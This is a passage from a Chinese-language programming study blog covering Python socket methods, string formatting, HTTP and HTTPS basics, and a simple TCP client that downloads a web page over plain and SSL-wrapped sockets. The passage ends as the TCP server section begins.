<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s.bind()<span class="comment">#绑定地址（host,port）到套接字， 在AF_INET下,以元组（host,port）的形式表示地址。</span></span><br><span class="line">s.listen()<span class="comment">#开始TCP监听。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。</span></span><br><span class="line">s.accept()<span class="comment">#被动接受TCP客户端连接,(阻塞式)等待连接的到来</span></span><br></pre></td></tr></table></figure>

<p>客户端套接字</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s.connect()<span class="comment">#主动初始化TCP服务器连接，。一般address的格式为元组（hostname,port），如果连接出错，返回socket.error错误。</span></span><br><span class="line">s.connect_ex()<span class="comment">#connect()函数的扩展版本,出错时返回出错码,而不是抛出异常</span></span><br></pre></td></tr></table></figure>

<p>公共用途的套接字函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s.recv()<span class="comment">#接收TCP数据，数据以字符串形式返回，bufsize指定要接收的最大数据量。flag提供有关消息的其他信息，通常可以忽略。</span></span><br><span class="line">s.send()<span class="comment">#发送TCP数据，将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。</span></span><br><span class="line">s.sendall()<span class="comment">#完整发送TCP数据，完整发送TCP数据。将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。</span></span><br><span class="line">s.recvfrom()<span class="comment">#接收UDP数据，与recv()类似，但返回值是（data,address）。其中data是包含接收数据的字符串，address是发送数据的套接字地址。</span></span><br><span class="line">s.sendto()<span class="comment">#发送UDP数据，将数据发送到套接字，address是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。</span></span><br><span class="line">s.close()<span class="comment">#关闭套接字</span></span><br><span class="line">s.getpeername()<span class="comment">#返回连接套接字的远程地址。返回值通常是元组（ipaddr,port）。</span></span><br><span class="line">s.getsockname()<span class="comment">#返回套接字自己的地址。通常是一个元组(ipaddr,port)</span></span><br><span class="line">s.setsockopt(level,optname,value)<span class="comment">#设置给定套接字选项的值。</span></span><br><span class="line">s.getsockopt(level,optname[.buflen])<span class="comment">#返回套接字选项的值。</span></span><br><span class="line">s.settimeout(timeout)<span class="comment">#设置套接字操作的超时期，timeout是一个浮点数，单位是秒。值为None表示没有超时期。一般，超时期应该在刚创建套接字时设置，因为它们可能用于连接的操作（如connect()）</span></span><br><span class="line">s.gettimeout()<span class="comment">#返回当前超时期的值，单位是秒，如果没有设置超时期，则返回None。</span></span><br><span class="line">s.fileno()<span class="comment">#返回套接字的文件描述符。</span></span><br><span class="line">s.setblocking(flag)<span class="comment">#如果flag为0，则将套接字设为非阻塞模式，否则将套接字设为阻塞模式（默认值）。非阻塞模式下，如果调用recv()没有发现任何数据，或send()调用无法立即发送数据，那么将引起socket.error异常。</span></span><br><span class="line">s.makefile()<span class="comment">#创建一个与该套接字相关连的文件</span></span><br></pre></td></tr></table></figure>

<p><strong>accept方法会返回一个含有两个元素的元组，（fd,addr）。</strong></p>
<p><strong>第一个元素是新的socket对象，服务器通过它与客户端通信。第二个元素是客户端的地址及端口信息。</strong></p>
<h4 id="格式化输出-s-d-等"><a href="#格式化输出-s-d-等" class="headerlink" title="格式化输出 %s %d 等"></a><strong>格式化输出 %s %d 等</strong></h4><table>
<thead>
<tr>
<th>%%</th>
<th>百分号标记</th>
</tr>
</thead>
<tbody><tr>
<td>%c</td>
<td>字符及其ASCII码</td>
</tr>
<tr>
<td><strong>%s</strong></td>
<td><strong>字符串</strong></td>
</tr>
<tr>
<td><strong>%d</strong></td>
<td><strong>有符号整数(十进制)</strong></td>
</tr>
<tr>
<td>%u</td>
<td>无符号整数(十进制)</td>
</tr>
<tr>
<td>%o</td>
<td>无符号整数(八进制)</td>
</tr>
<tr>
<td>%x</td>
<td>无符号整数(十六进制)</td>
</tr>
<tr>
<td>%X</td>
<td>无符号整数(十六进制大写字符)</td>
</tr>
<tr>
<td>%e</td>
<td>浮点数字(科学计数法)</td>
</tr>
<tr>
<td>%E</td>
<td>浮点数字(科学计数法，用E代替e)</td>
</tr>
<tr>
<td>%f</td>
<td>浮点数字(用小数点符号)</td>
</tr>
<tr>
<td>%g</td>
<td>浮点数字(根据值的大小采用%e或%f)</td>
</tr>
<tr>
<td>%G</td>
<td>浮点数字(类似于%g)</td>
</tr>
<tr>
<td>%p</td>
<td>指针(用十六进制打印值的内存地址)</td>
</tr>
<tr>
<td>%n</td>
<td>存储输出字符的数量放进参数列表的下一个变量中</td>
</tr>
</tbody></table>
<h4 id="format-格式化函数"><a href="#format-格式化函数" class="headerlink" title="format 格式化函数"></a>format 格式化函数</h4><p>基本语法是通过 {} 和 : 来代替以前的 % 。</p>
<p>format 函数可以接受不限个参数，位置可以不按顺序。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">"网站名：&#123;name&#125;, 地址 &#123;url&#125;"</span>.format(name=<span class="string">"菜鸟教程"</span>, url=<span class="string">"www.runoob.com"</span>))</span><br></pre></td></tr></table></figure>





<hr>
<h3 id="python2和python3的一些区别"><a href="#python2和python3的一些区别" class="headerlink" title="python2和python3的一些区别"></a>python2和python3的一些区别</h3><p>b = b”example”    # bytes object   </p>
<p>s = “example”     # str object  </p>
<ul>
<li>chj=str.encode(c)  str to bytes </li>
<li>chj=bytes.decode(c) bytes to str</li>
</ul>
<h3 id="HTTP与HTTPS"><a href="#HTTP与HTTPS" class="headerlink" title="HTTP与HTTPS"></a>HTTP与HTTPS</h3><h4 id="1-HTTP的基本概念"><a href="#1-HTTP的基本概念" class="headerlink" title="1.HTTP的基本概念"></a><strong>1.HTTP的基本概念</strong></h4><p>HTTP：<a href="https://baike.baidu.com/item/超文本传输协议/8535513" target="_blank" rel="noopener">超文本传输协议</a>（HTTP，HyperText Transfer Protocol)是<a href="https://baike.baidu.com/item/互联网" target="_blank" rel="noopener">互联网</a>上应用最为广泛的一种<a href="https://baike.baidu.com/item/网络协议/328636" target="_blank" rel="noopener">网络协议</a>。设计Http最初的目的是为了提供一种发布和接收<a href="https://baike.baidu.com/item/HTML" target="_blank" rel="noopener">HTML</a>页面的方法。它可以使浏览器更加高效。Http协议是以明文方式发送信息的，如果黑客截取了Web浏览器和服务器之间的传输报文，就可以直接获得其中的信息。</p>
<p><strong>HTTP原理：</strong></p>
<p>①  客户端的浏览器首先要通过网络与服务器建立连接，该<strong>连接是通过TCP 来完成的，一般 TCP 连接的端口号是80</strong>。  建立连接后，客户机发送一个请求给服务器，请求方式的格式为：<strong>统一资源标识符（URL）、协议版本号，后边是 MIME  信息包括请求修饰符、客户机信息和许可内容。</strong></p>
<p>② 服务器接到请求后，给予相应的响应信息，其格式为一个状态行，包括信息的协议版本号、一个成功或错误的代码，后边是 MIME 信息包括服务器信息、实体信息和可能的内容。</p>
<h4 id="—-常见的HTTP相应状态码"><a href="#—-常见的HTTP相应状态码" class="headerlink" title="—-常见的HTTP相应状态码"></a><strong>—-常见的HTTP相应状态码</strong></h4><p>200：请求被正常处理<br>204：请求被受理但没有资源可以返回<br>206：客户端只是请求资源的一部分，服务器只对请求的部分资源执行GET方法，相应报文中通过Content-Range指定范围的资源。<br>301：永久性重定向<br>302：临时重定向<br>303：与302状态码有相似功能，只是它希望客户端在请求一个URI的时候，能通过GET方法重定向到另一个URI上<br>304：发送附带条件的请求时，条件不满足时返回，与重定向无关<br>307：临时重定向，与302类似，只是强制要求使用POST方法<br>400：请求报文语法有误，服务器无法识别<br>401：请求需要认证<br>403：请求的对应资源禁止被访问<br>404：服务器无法找到对应资源<br>500：服务器内部错误<br>503：服务器正忙</p>
<h4 id="—-GET方法与POST方法的区别"><a href="#—-GET方法与POST方法的区别" class="headerlink" title="—-GET方法与POST方法的区别"></a>—-GET方法与POST方法的区别</h4><p>区别一：<br>get重点在从服务器上获取资源，post重点在向服务器发送数据；<br>区别二：<br>get传输数据是通过URL请求，以field（字段）= value的形式，置于URL后，并用”?”连接，<strong>多个请求数据间用”&amp;”连接</strong>，如<a href="http://127.0.0.1/Test/login.action?name=admin&amp;password=admin，这个过程用户是可见的；" target="_blank" rel="noopener">http://127.0.0.1/Test/login.action?name=admin&amp;password=admin，这个过程用户是可见的；</a><br>post传输数据通过Http的post机制，将字段与对应值封存在请求实体中发送给服务器，这个过程对用户是不可见的；<br>区别三：<br>Get传输的数据量小，因为受URL长度限制，但效率较高；<br><strong>Post可以传输大量数据，所以上传文件时只能用Post方式</strong>；<br>区别四：<br>get是不安全的，因为URL是可见的，可能会泄露私密信息，如密码等；<br>post较get安全性较高；<br>区别五：<br>get方式只能支持ASCII字符，向服务器传的中文字符可能会乱码。<br><strong>post支持标准字符集，可以正确传递中文字符</strong>。</p>
<h4 id="—-HTTP请求报文与响应报文格式"><a href="#—-HTTP请求报文与响应报文格式" class="headerlink" title="—-HTTP请求报文与响应报文格式"></a><strong>—-HTTP请求报文与响应报文格式</strong></h4><p><strong>请求报文</strong>包含三部分：<br>a、请求行：包含<strong>请求方法、URI、HTTP版本信息</strong><br>b、请求首部字段<br>c、请求内容实体<br><strong>响应报文</strong>包含三部分：<br>a、状态行：<strong>包含HTTP版本、状态码、状态码的原因短语</strong><br>b、响应首部字段<br>c、响应内容实体</p>
<h4 id="—-常见HTTP首部字段"><a href="#—-常见HTTP首部字段" class="headerlink" title="—-常见HTTP首部字段"></a><strong>—-常见HTTP首部字段</strong></h4><p><strong>a、通用首部字段（请求报文与响应报文都会使用的首部字段）</strong><br>Date：创建报文时间<br>Connection：连接的管理<br>Cache-Control：缓存的控制<br>Transfer-Encoding：报文主体的传输编码方式</p>
<p><strong>b、请求首部字段（请求报文会使用的首部字段）</strong><br>Host：请求资源所在服务器<br>Accept：可处理的媒体类型<br>Accept-Charset：可接收的字符集<br>Accept-Encoding：可接受的内容编码<br>Accept-Language：可接受的自然语言</p>
<p><strong>c、响应首部字段（响应报文会使用的首部字段）</strong><br>Accept-Ranges：可接受的字节范围<br>Location：令客户端重新定向到的URI<br>Server：HTTP服务器的安装信息d、实体首部字段（请求报文与响应报文的的实体部分使用的首部字段）<br>Allow：资源可支持的HTTP方法<br>Content-Type：实体主类的类型<br>Content-Encoding：实体主体适用的编码方式<br>Content-Language：实体主体的自然语言<br>Content-Length：实体主体的的字节数<br>Content-Range：实体主体的位置范围，一般用于发出部分请求时使用</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/csl/</span> HTTP/1.1</span><br></pre></td></tr></table></figure>

<p><code>GET</code>表示一个读取请求，将从服务器获得网页数据<code>/cs1/</code>表示URL的路径，URL总是以<code>/</code>开头，<code>/</code>就表示首页，最后的<code>HTTP/1.1</code>指示采用的HTTP协议版本是1.1。目前HTTP协议的版本就是1.1，但是大部分服务器也支持1.0版本，主要区别在于1.1版本允许多个HTTP请求复用一个TCP连接，以加快传输速度。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Host</span>: sports.sina.com.cn</span><br></pre></td></tr></table></figure>

<p>表示请求的域名是<code>sports.sina.com.cn</code>。如果一台服务器有多个网站，服务器就需要通过<code>Host</code>来区分浏览器请求的是哪个网站</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span>: text/html</span><br><span class="line"><span class="attribute">Content-Length</span>: 66125</span><br></pre></td></tr></table></figure>

<p><code>Content-Type</code>指示响应的内容，这里是<code>text/html</code>表示HTML网页。</p>
<p><strong>请注意，浏览器就是依靠<code>Content-Type</code>来判断响应的内容是网页还是图片，是视频还是音乐。</strong></p>
<p>浏览器并不靠URL来判断响应的内容，所以，即使URL是<code>http://example.com/abc.jpg</code>，它也不一定就是图片。</p>
<h4 id="—-常用的HTTP方法有哪些？"><a href="#—-常用的HTTP方法有哪些？" class="headerlink" title="—-常用的HTTP方法有哪些？"></a>—-常用的HTTP方法有哪些？</h4><p>GET： 用于请求访问已经被URI（统一资源标识符）识别的资源，可以通过URL传参给服务器<br>POST：用于传输信息给服务器，主要功能与GET方法类似，但一般推荐使用POST方式。<br>PUT： 传输文件，报文主体中包含文件内容，保存到对应URI位置。<br>HEAD： 获得报文首部，与GET方法类似，只是不返回报文主体，一般用于验证URI是否有效。<br>DELETE：删除文件，与PUT方法相反，删除对应URI位置的文件。<br>OPTIONS：查询相应URI支持的HTTP方法。</p>
<h4 id="—-HTTP请求"><a href="#—-HTTP请求" class="headerlink" title="—-HTTP请求"></a><strong>—-HTTP请求</strong></h4><p><strong>步骤1：浏览器首先向服务器发送HTTP请求，请求包括：</strong></p>
<p>方法：<code>GET</code>还是<code>POST</code>，<code>GET</code>仅请求资源，<code>POST</code>会附带用户数据；</p>
<p>路径：<code>/full/url/path</code>；</p>
<p>域名：由Host头指定：<code>Host: www.sina.com.cn</code></p>
<p>以及其他相关的Header；</p>
<p>如果是POST，那么请求还包括一个Body，包含用户数据。</p>
<p><strong>步骤2：服务器向浏览器返回HTTP响应，响应包括：</strong></p>
<p>响应代码：<code>200</code>表示成功，<code>3xx</code>表示重定向( <strong>表示要完成请求，需要进一步操作</strong>)，<code>4xx</code>表示客户端发送的请求有错误，<code>5xx</code>表示服务器端处理时发生了错误；</p>
<p>响应类型：由<code>Content-Type</code>指定，例如：<code>Content-Type: text/html;charset=utf-8</code>表示响应类型是HTML文本，并且编码是<code>UTF-8</code>，<code>Content-Type: image/jpeg</code>表示响应类型是JPEG格式的图片；</p>
<p>以及其他相关的Header；</p>
<p>通常服务器的HTTP响应会携带内容，也就是有一个Body，包含响应的内容，网页的HTML源码就在Body中。</p>
<p><strong>步骤3：如果浏览器还需要继续向服务器请求其他资源，比如图片，就再次发出HTTP请求，重复步骤1、2</strong></p>
<p>Web采用的HTTP协议采用了非常简单的请求-响应模式，从而大大简化了开发。当我们编写一个页面时，我们只需要在HTTP响应中把HTML发送出去，不需要考虑如何附带图片、视频等，浏览器如果需要请求图片和视频，它会发送另一个HTTP请求，因此，一个HTTP请求只处理一个资源。</p>
<p>HTTP协议同时具备极强的扩展性，虽然浏览器请求的是<code>http://www.sina.com.cn/</code>的首页，但是新浪在HTML中可以链入其他服务器的资源，比如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">"http://i1.sinaimg.cn/home/2013/1008/U8455P30DT20131008135420.png"</span>&gt;</span><br></pre></td></tr></table></figure>

<p>从而将请求压力分散到各个服务器上，并且，一个站点可以链接到其他站点，无数个站点互相链接起来，就形成了World Wide Web，简称“三达不溜”（WWW）。</p>
<h4 id="—-HTTP格式"><a href="#—-HTTP格式" class="headerlink" title="—-HTTP格式"></a>—-HTTP格式</h4><p>每个HTTP请求和响应都遵循相同的格式，一个HTTP包含Header和Body两部分，其中Body是可选的。</p>
<p>HTTP协议是一种文本协议，所以，它的格式也非常简单。HTTP GET请求的格式：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/path</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Header1</span>: Value1</span><br><span class="line"><span class="attribute">Header2</span>: Value2</span><br><span class="line"><span class="attribute">Header3</span>: Value3</span><br></pre></td></tr></table></figure>

<p>每个Header一行一个，换行符是<code>\r\n</code>。</p>
<p>HTTP POST请求的格式：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/path</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Header1</span>: Value1</span><br><span class="line"><span class="attribute">Header2</span>: Value2</span><br><span class="line"><span class="attribute">Header3</span>: Value3</span><br><span class="line"></span><br><span class="line">body data goes here...</span><br></pre></td></tr></table></figure>

<p>当遇到连续两个<code>\r\n</code>时，Header部分结束，后面的数据全部是Body。</p>
<p>HTTP响应的格式：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">200 OK</span><br><span class="line"><span class="attribute">Header1</span>: Value1</span><br><span class="line"><span class="attribute">Header2</span>: Value2</span><br><span class="line"><span class="attribute">Header3</span>: Value3</span><br><span class="line"></span><br><span class="line">body data goes here...</span><br></pre></td></tr></table></figure>

<p>HTTP响应如果包含body，也是通过<code>\r\n\r\n</code>来分隔的。请再次注意，Body的数据类型由<code>Content-Type</code>头来确定，如果是网页，Body就是文本，如果是图片，Body就是图片的二进制数据。</p>
<p>当存在<code>Content-Encoding</code>时，Body数据是被压缩的，最常见的压缩方式是gzip，所以，看到<code>Content-Encoding: gzip</code>时，需要将Body数据先解压缩，才能得到真正的数据。压缩的目的在于减少Body的大小，加快网络传输。</p>
<h4 id="2-HTTPS的基本概念"><a href="#2-HTTPS的基本概念" class="headerlink" title="2.HTTPS的基本概念"></a>2.HTTPS的基本概念</h4><h4 id="—-原理"><a href="#—-原理" class="headerlink" title="—-原理"></a><strong>—-原理</strong></h4><p> Https：是以安全为目标的Http通道，是Http的安全版。Https的安全基础是SSL。SSL协议位于<a href="https://baike.baidu.com/item/TCP/IP协议" target="_blank" rel="noopener">TCP/IP协议</a>与各种应用层协议之间，为<a href="https://baike.baidu.com/item/数据通讯" target="_blank" rel="noopener">数据通讯</a>提供安全支持。SSL协议可分为两层：SSL记录协议（SSL Record Protocol），它建立在可靠的传输协议（如TCP）之上，为高层协议提供<a href="https://baike.baidu.com/item/数据封装" target="_blank" rel="noopener">数据封装</a>、压缩、加密等基本功能的支持。SSL握手协议（SSL Handshake Protocol），它建立在SSL记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。</p>
<p><strong>Https设计目标：</strong></p>
<p>(1)数据保密性：保证数据内容在传输的过程中不会被第三方查看。就像快递员传递包裹一样，都进行了封装，别人无法获知里面装了什么 。</p>
<p>(2)数据完整性：及时发现被第三方篡改的传输内容。就像快递员虽然不知道包裹里装了什么东西，但他有可能中途掉包，数据完整性就是指如果被掉包，我们能轻松发现并拒收 。</p>
<p>(3)身份校验安全性：保证数据到达用户期望的目的地。就像我们邮寄包裹时，虽然是一个封装好的未掉包的包裹，但必须确定这个包裹不会送错地方，通过身份校验来确保送对了地方 。</p>
<p><strong>Https原理：</strong></p>
<p>① 客户端将它所支持的算法列表和一个用作产生密钥的随机数发送给服务器；</p>
<p>② 服务器从算法列表中选择一种加密算法，并将它和一份包含<a href="https://baike.baidu.com/item/服务器/100571" target="_blank" rel="noopener">服务器</a>公用密钥的证书发送给<a href="https://baike.baidu.com/item/客户端/101081" target="_blank" rel="noopener">客户端</a>；该证书还包含了用于认证目的的服务器标识，服务器同时还提供了一个用作产生密钥的随机数；</p>
<p>③ 客户端对服务器的证书进行验证（有关验证证书，可以参考<a href="https://baike.baidu.com/item/数字签名/212550" target="_blank" rel="noopener">数字签名</a>），并抽取服m务器的公用密钥；然后，再产生一个称作 pre_master_secret 的随机密码串，并使用服务器的公用密钥对其进行加密（参考非对称加 / 解密），并将加密后的信息发送给服务器；</p>
<p>④ 客户端与服务器端根据 pre_master_secret 以及客户端与服务器的随机数值独立计算出加密和 <a href="https://baike.baidu.com/item/MAC/173" target="_blank" rel="noopener">MAC</a>密钥（参考 DH密钥交换算法） ；</p>
<p>⑤ 客户端将所有握手消息的 MAC 值发送给服务器；</p>
<p>⑥ 服务器将所有握手消息的 MAC 值发送给客户端。</p>
<h4 id="3-HTTP与HTTPS的区别"><a href="#3-HTTP与HTTPS的区别" class="headerlink" title="3.HTTP与HTTPS的区别"></a><strong>3.HTTP与HTTPS的区别</strong></h4><p>1、https协议需要到CA （Certificate Authority，证书颁发机构）申请证书，一般免费证书较少，因而需要一定费用。(原来网易官网是http，而网易邮箱是https。)</p>
<p>2、http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl加密传输协议。</p>
<p>3、http和https使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。</p>
<p>4、http的连接很简单，是无状态的。Https协议是由SSL+Http协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。(无状态的意思是其数据包的发送、传输和接收都是相互独立的。无连接的意思是指通信双方都不长久的维持对方的任何信息。)</p>
<h4 id="—-HTTPS的缺点（对比优点）"><a href="#—-HTTPS的缺点（对比优点）" class="headerlink" title="—-HTTPS的缺点（对比优点）"></a><strong>—-HTTPS的缺点（对比优点）</strong></h4><p>1、Https协议握手阶段比较费时，会使页面的加载时间延长近。</p>
<p>2、Https连接缓存不如Http高效，会增加数据开销，甚至已有的安全措施也会因此而受到影响。</p>
<p>3、Https协议的安全是有范围的，在黑客攻击、拒绝服务攻击和服务器劫持等方面几乎起不到什么作用。</p>
<p>4、SSL证书通常需要绑定IP，不能在同一IP上绑定多个域名，IPv4资源不可能支撑这个消耗。</p>
<p>5、成本增加。部署 Https后，因为 Https协议的工作要增加额外的计算资源消耗，例如 SSL 协议加密算法和 SSL 交互次数将占用一定的计算资源和服务器成本。</p>
<p>6、Https协议的加密范围也比较有限。最关键的，SSL证书的信用链体系并不安全，特别是在某些国家可以控制CA根证书的情况下，中间人攻击一样可行。</p>
<h4 id="—-HTTP1-1版本新特性"><a href="#—-HTTP1-1版本新特性" class="headerlink" title="—-HTTP1.1版本新特性"></a>—-HTTP1.1版本新特性</h4><p>a、默认持久连接节省通信量，只要客户端服务端任意一端没有明确提出断开TCP连接，就一直保持连接，可以发送多次HTTP请求</p>
<p>b、管线化，客户端可以同时发出多个HTTP请求，而不用一个个等待响应</p>
<p>c、断点续传原理</p>
<h4 id="—-HTTP的缺点与HTTPS"><a href="#—-HTTP的缺点与HTTPS" class="headerlink" title="—-HTTP的缺点与HTTPS"></a>—-HTTP的缺点与HTTPS</h4><p>a、通信使用明文不加密，内容可能被窃听<br>b、不验证通信方身份，可能遭到伪装<br>c、无法验证报文完整性，可能被篡改</p>
<p>HTTPS就是HTTP加上加密处理（一般是SSL安全通信线路）+认证+完整性保护</p>
<hr>
<h3 id="python网络编程"><a href="#python网络编程" class="headerlink" title="python网络编程"></a><strong>python网络编程</strong></h3><h4 id="1-TCP客户端编程"><a href="#1-TCP客户端编程" class="headerlink" title="1.TCP客户端编程"></a>1.TCP客户端编程</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入socket库:</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个socket:</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># 建立连接:</span></span><br><span class="line">s.connect((<span class="string">'www.sina.com.cn'</span>, <span class="number">80</span>))</span><br></pre></td></tr></table></figure>

<p>创建Socket时，AF_INET指定使用IPv4协议，如果要用更先进的IPv6，就指定为AF_INET6。</p>
<p><strong>SOCK_STREAM指定使用面向流的TCP协议</strong>，这样，一个Socket对象就创建成功，但是还没有建立连接。<br>客户端要主动发起TCP连接，必须知道服务器的IP地址和端口号。<br><strong>作为服务器，提供什么样的服务，端口号就必须固定下来</strong>。由于我们想要访问网页，因此新浪提供网页服务的服务器必须把端口号固定在80端口，<strong>因为80端口是Web服务的标准端口</strong>。</p>
<p>其他服务都有对应的标准端口号,例如SMTP服务是25端口，FTP服务是21端口，等等。</p>
<p>端口号小于1024的是Internet标准服务的端口，端口号大于1024的，可以任意使用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s.connect((<span class="string">'www.sina.com.cn'</span>, <span class="number">80</span>))</span><br></pre></td></tr></table></figure>

<p>注意参数是一个<code>tuple</code>（元组），包含地址和端口号。</p>
<p>建立TCP连接后，我们就可以向新浪服务器发送请求，要求返回首页的内容：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 发送数据:</span></span><br><span class="line">s.send(<span class="string">b'GET / HTTP/1.1\r\nHost: www.sina.com.cn\r\nConnection: close\r\n\r\n'</span>)</span><br></pre></td></tr></table></figure>

<p>TCP连接创建的是双向通道，双方都可以同时给对方发数据。但是谁先发谁后发，怎么协调，要根据具体的协议来决定。例如，HTTP协议规定客户端必须先发请求给服务器，服务器收到后才发数据给客户端。</p>
<p>发送的文本格式必须符合HTTP标准，如果格式没问题，接下来就可以接收新浪服务器返回的数据了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 接收数据:</span></span><br><span class="line">buffer = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 每次最多接收1k字节:</span></span><br><span class="line">    d = s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">if</span> d:</span><br><span class="line">        buffer.append(d)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">data = <span class="string">b''</span>.join(buffer)</span><br></pre></td></tr></table></figure>

<p>接收数据时，调用<code>recv(max)</code>方法，一次最多接收指定的字节数，因此，在一个while循环中反复接收，直到<code>recv()</code>返回空数据，表示接收完毕，退出循环。</p>
<p>当我们接收完数据后，调用<code>close()</code>方法关闭Socket，这样，一次完整的网络通信就结束了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 关闭连接:</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<p>接收到的数据包括HTTP头和网页本身，我们只需要把HTTP头和网页分离一下，把HTTP头打印出来，网页内容保存到文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">header, html = data.split(<span class="string">b'\r\n\r\n'</span>, <span class="number">1</span>)</span><br><span class="line">print(header.decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="comment"># 把接收的数据写入文件:</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'sina.html'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(html)</span><br></pre></td></tr></table></figure>

<p>现在，只需要在浏览器中打开这个<code>sina.html</code>文件，就可以看到新浪的首页了。</p>
<p>需要注意的是，直接访问新浪会返回301，重定向到https:sina.com.cn，所以这里需要进行HTTPS连接，改为443端口</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"></span><br><span class="line">s=ssl.wrap_socket(socket.socket(socket.AF_INET,socket.SOCK_STREAM))</span><br><span class="line"><span class="comment">#s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span></span><br><span class="line">s.connect((<span class="string">'www.orld.top'</span>,<span class="number">443</span>))</span><br><span class="line">s.send(<span class="string">b'GET / HTTP/1.1\r\nHost: www.orld.top\r\n\r\n'</span>)</span><br><span class="line"><span class="comment">#User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0\r\n</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"ok:"</span>)</span><br><span class="line">buffer=[]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    d=s.recv(<span class="number">8192</span>)</span><br><span class="line">    <span class="keyword">if</span> d:</span><br><span class="line">        print(d)</span><br><span class="line">        buffer.append(d)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">data=<span class="string">b''</span>.join(buffer)</span><br><span class="line">s.close()</span><br><span class="line">header,html=data.split(<span class="string">b'\r\n\r\n'</span>,<span class="number">1</span>)</span><br><span class="line">print(header.decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'C:/Users/最恐怖的小怪兽/Desktop/123.html'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(html)</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: nginx</span><br><span class="line"><span class="attribute">Date</span>: Sat, 21 Mar 2020 12:29:16 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html</span><br><span class="line"><span class="attribute">Content-Length</span>: 539941</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">ETag</span>: "5e760817-7ea13"V=CCD0B746</span><br><span class="line"><span class="attribute">X-Powered-By</span>: shci_v1.03</span><br><span class="line"><span class="attribute">Expires</span>: Sat, 21 Mar 2020 12:29:23 GMT</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=60</span><br><span class="line"><span class="attribute">X-Via-SSL</span>: ssl.25.sinag1.yzyh.lb.sinanode.com</span><br><span class="line"><span class="attribute">Age</span>: 53</span><br><span class="line"><span class="attribute">Via</span>: https/1.1 ctc.guangzhou.union.182 (ApacheTrafficServer/6.2.1 [cRs f ]), https/1.1 cnc.guangzhou.union.69 (ApacheTrafficServer/6.2.1 [cRs f ])</span><br><span class="line"><span class="attribute">X-Via-Edge</span>: 1584793756134266f61d3f0065a703ed25d82</span><br><span class="line"><span class="attribute">X-Cache</span>: HIT.69</span><br><span class="line"><span class="attribute">X-Via-CDN</span>: f=edge,s=cnc.guangzhou.union.73.nb.sinaedge.com,c=211.97.111.38;f=edge,s=cnc.guangzhou.union.69.nb.sinaedge.com,c=112.90.6.73;f=Edge,s=cnc.guangzhou.union.69,c=112.90.6.69</span><br></pre></td></tr></table></figure>

<h4 id="2-TCP服务器编程"><a href="#2-TCP服务器编程" class="headerlink" title="2.TCP服务器编程"></a><strong>2.TCP服务器编程</strong></h4><p>和客户端编程相比，服务器编程就要复杂一些。</p>
